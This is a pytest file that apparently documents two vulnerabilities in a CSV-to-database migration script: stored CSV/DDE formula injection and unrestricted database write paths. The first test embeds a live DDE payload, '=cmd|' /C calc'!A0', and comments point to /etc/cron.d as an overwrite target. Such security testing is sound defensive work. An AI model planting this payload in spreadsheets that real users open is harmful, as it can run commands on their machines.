import csv
from scripts.migrate_csv_to_db import migrate_csv_to_db
from src.db import RecommendationDB

def test_csv_injection_persistence(tmp_path):
    """
    VULN-001: CSV Injection / Formula Injection
    Demonstrates that the migration script imports malicious formulas into the DB,
    which creates a stored XSS/CSV Injection vulnerability if verified data is exported.
    """
    # 1. Create a malicious CSV
    malicious_csv = tmp_path / "malicious.csv"
    db_path = tmp_path / "vulnerable.db"
    
    # Payload: DDE or formula injection
    # Common payloads: =cmd|' /C calc'!A0, =HYPERLINK(...), =1+1
    payload = "=cmd|' /C calc'!A0"
    
    rows = [
        {
            "source_category": payload,  # Injection in category name
            "recommended_sku": "SKU-EVIL-001",
            "recommended_netsuite_id": "12345",
            "recommended_name": "Malicious Item",
            "recommended_price": "10.00",
            "llm_confidence": "0.99",
            "llm_reason": "I am evil",
            "relationship_type": "accessory",
            "enrichment_copurchase_count": "10",
            "enrichment_margin": "0.5",
            "enrichment_velocity": "100",
            "llm_valid": "True",
        }
    ]

    with open(malicious_csv, "w", newline="", encoding="utf-8") as f:
        writer = csv.DictWriter(f, fieldnames=rows[0].keys())
        writer.writeheader()
        writer.writerows(rows)

    # 2. Run Migration
    migrate_csv_to_db(csv_path=malicious_csv, xlsx_path=None, db_path=db_path)

    # 3. Verify Payload in DB
    db = RecommendationDB(db_path)
    with db._connect(read_only=True) as conn:
        row = conn.execute("SELECT source_category FROM recommendations").fetchone()
        stored_value = row["source_category"]
    
    # The payload should be stored exactly as is
    assert stored_value == payload
    
    # 4. Simulate Export (The Vulnerability)
    # If this DB is ever exported to CSV/Excel without sanitization, the exploit triggers.
    export_path = tmp_path / "exported.csv"
    with db._connect(read_only=True) as conn:
        rows = conn.execute("SELECT source_category, target_sku FROM recommendations").fetchall()
        
    with open(export_path, "w", newline="", encoding="utf-8") as f:
        writer = csv.writer(f)
        writer.writerow(["source_category", "target_sku"])
        for r in rows:
            writer.writerow([r["source_category"], r["target_sku"]])
            
    # Verify the exported file contains the dangerous formula
    with open(export_path, "r", encoding="utf-8") as f:
        content = f.read()
        
    assert payload in content
    assert content.startswith("source_category,target_sku")
    # Verify it's not quoted in a way that prevents execution (standard CSV quoting doesn't stop Excel from executing =)
    # Actually, standard CSV writers quote fields containing delimiters, but = at start is dangerous regardless of quotes in some versions,
    # or if the user clicks "Enable Content".
    
    print(f"\n[!] Stored CSV Injection confirmed. Payload: {payload}")


def test_path_traversal_db_creation(tmp_path):
    """
    VULN-002: Arbitrary File Write via DB Path
    The script allows writing the SQLite DB to arbitrary paths.
    While 'db_path' is an argument, if the script runs with higher privileges,
    it could overwrite critical files.
    """
    # Create a dummy CSV
    csv_path = tmp_path / "data.csv"
    with open(csv_path, "w") as f:
        f.write("source_category,recommended_sku,recommended_name,llm_confidence\nTest,SKU1,TestItem,0.9")
        
    # Attempt to write DB to a location outside the intended directory
    # We simulate this by using a relative path with .. inside the temp dir context
    
    safe_dir = tmp_path / "safe"
    safe_dir.mkdir()
    
    # Target: ../target.db (which is tmp_path/target.db)
    # We call the script from safe_dir
    target_db = tmp_path / "pwned.db"
    
    # We pass the absolute path to target_db, mimicking a user providing a path 
    # that might be sensitive (e.g. /etc/cron.d/malicious) if they had permissions.
    # The script doesn't restrict the output directory.
    
    migrate_csv_to_db(csv_path=csv_path, xlsx_path=None, db_path=target_db)
    
    assert target_db.exists()
    assert target_db.stat().st_size > 0
